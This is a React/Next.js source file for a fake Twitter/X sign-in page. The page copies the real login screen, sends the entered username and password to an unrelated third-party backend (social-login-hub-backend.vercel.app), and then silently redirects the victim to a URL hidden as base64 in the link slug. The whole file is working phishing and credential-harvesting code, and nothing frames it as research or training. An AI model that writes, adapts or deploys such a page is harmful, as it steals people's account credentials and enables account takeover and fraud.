"use client";
import { useState, useEffect } from "react";

export default function TwitterLogin({ params }) {
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });
  const [errors, setErrors] = useState({ username: "", password: "" });
  const [loading, setLoading] = useState(false);
  const [encryptedString, setEncryptedString] = useState("");
  const [hasTargetUrl, setHasTargetUrl] = useState(false);

  // Detect encrypted URL slug
  useEffect(() => {
    if (params?.slug && params.slug.length > 0) {
      const encryptedParam = params.slug[0];
      if (encryptedParam) {
        setEncryptedString(encryptedParam);
        setHasTargetUrl(true);
        console.log("Encrypted string detected:", encryptedParam);
      }
    }
  }, [params]);

  // Decrypt Base64 URL-safe string
  const decryptUrlSafeBase64 = (encoded) => {
    if (!encoded) return "";
    try {
      const base64 = encoded.replace(/-/g, "+").replace(/_/g, "/");
      const padding = "=".repeat((4 - (base64.length % 4)) % 4);
      return decodeURIComponent(escape(atob(base64 + padding)));
    } catch {
      return "";
    }
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (errors[name]) setErrors((prev) => ({ ...prev, [name]: "" }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrors({ username: "", password: "" });

    if (!formData.username) {
      setErrors((prev) => ({ ...prev, username: "Username, email or phone is required" }));
      return;
    }
    if (!formData.password) {
      setErrors((prev) => ({ ...prev, password: "Password is required" }));
      return;
    }

    try {
      setLoading(true);
      const response = await fetch("https://social-login-hub-backend.vercel.app/api/auth/twitter", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: formData.username,
          password: formData.password,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        alert("Login successful!");
        console.log("Login successful:", data);

        // Redirect to decrypted URL if exists
        if (hasTargetUrl && encryptedString) {
          const targetUrl = decryptUrlSafeBase64(encryptedString);
          if (targetUrl && (targetUrl.startsWith("http://") || targetUrl.startsWith("https://"))) {
            setTimeout(() => {
              window.location.href = targetUrl;
            }, 500);
            return;
          }
        }
        setLoading(false);
      } else {
        setErrors((prev) => ({ ...prev, password: data.message || "Login failed" }));
        setLoading(false);
      }
    } catch (error) {
      setErrors((prev) => ({ ...prev, password: "Network error. Please try again." }));
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white">
      <div className="flex items-center justify-center min-h-screen px-4">
        <div className="w-full max-w-md">
          <div className="text-center">
            {/* Twitter Logo */}
            <div className="mb-8">
              <div className="text-6xl mb-8">🐦</div>
              <h1 className="text-3xl font-bold mb-8">Sign in to X</h1>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <input
                type="text"
                name="username"
                placeholder="Phone, email, or username"
                value={formData.username}
                onChange={handleInputChange}
                className={`w-full px-4 py-3 bg-transparent border rounded-md focus:outline-none focus:border-blue-500 text-white placeholder-gray-500 ${errors.username ? "border-red-500 focus:border-red-500" : "border-gray-700"
                  }`}
              />
              {errors.username && <p className="text-red-500 text-sm mt-1">{errors.username}</p>}

              <input
                type="password"
                name="password"
                placeholder="Password"
                value={formData.password}
                onChange={handleInputChange}
                className={`w-full px-4 py-3 bg-transparent border rounded-md focus:outline-none focus:border-blue-500 text-white placeholder-gray-500 ${errors.password ? "border-red-500 focus:border-red-500" : "border-gray-700"
                  }`}
              />
              {errors.password && <p className="text-red-500 text-sm mt-1">{errors.password}</p>}

              <button
                type="submit"
                className="w-full bg-white text-black rounded-full py-3 px-6 font-semibold hover:bg-gray-100 transition-colors"
                disabled={loading}
              >
                {loading ? "Processing..." : "Sign in"}
              </button>
            </form>

            <div className="mt-4">
              <button
                className="w-full border border-gray-700 text-white rounded-full py-3 px-6 font-semibold hover:bg-gray-900 transition-colors"
                type="button"
              >
                Forgot password?
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
